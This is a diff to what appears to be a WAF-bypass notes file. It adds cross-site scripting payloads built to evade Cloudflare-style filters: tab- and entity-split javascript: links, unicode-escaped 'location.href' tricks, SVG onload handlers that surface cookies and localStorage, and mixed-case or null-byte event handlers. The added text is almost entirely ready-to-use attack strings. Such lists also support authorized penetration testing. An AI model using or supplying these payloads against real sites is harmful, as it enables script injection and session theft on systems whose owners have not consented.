@@ -59,7 +59,49 @@ Cache-level:
 - Leading dot in host: `target.com.` (trailing dot) → different edge behavior.
 - WebSocket upgrade — WAF rules often only apply to HTTP.
 - Worker routes — occasionally expose origin via `fetch(origin_url)` patterns.
-- See `Cloudflare-WAF-Bypass/` for kdairatchi-collected PoCs.
+
+### Tab-split href (javascript: bypass in `<a>` tags)
+
+```html
+<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:alert(1)">XSS</a>
+<a href="javas&Tab;cript:alert()">XSS</a>
+<a href="javas&#9;cript:alert()">XSS</a>
+<a href="javas&#x09;cript:alert()">XSS</a>
+<a href="j&#9;a&#9;v&#9;a&#9;s&#9;c&#9;r&#9;i&#9;p&#9;t:alert()">XSS</a>
+```
+
+### Unicode escape + HTML entity bypass (for `location.href` WAF block)
+
+WAF blocks `location.href` literally; bypass by unicode-escaping the `o` characters,
+then escaping the backslash itself via HTML entities:
+
+```
+" onclick=l&#92;u{6F}cati&#92;u{6F}n.href="javascript:alert(1)">
+```
+
+`&#92;` = backslash (HTML entity), `\u{6F}` = `o` (unicode escape).
+Chain: WAF sees `l\u{6F}cati\u{6F}n.href` and misses it; JS engine evaluates to `location.href`.
+
+### svg/event-handler bypasses
+
+```html
+<svg%0Aonauxclick=0;[1].some(confirm)//
+<svg onload=alert%26%230000000040"")>
+<svg onx=() onload=(confirm)(1)>
+<svg onx=() onload=(confirm)(document.cookie)>
+<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
+```
+
+### Mixed case / null-byte event handlers
+
+```
+"Onx=() onMouSeoVer=prompt(1)>
+"%01onClick=prompt(1)>
+"%2501onclick=prompt(1)>
+"onClick="(prompt)(1)"
+"OnCliCk="(prompt`1`)"
+"Onclick="([1].map(confirm))
+```
 
 ## Akamai / Imperva / F5 / AWS
 
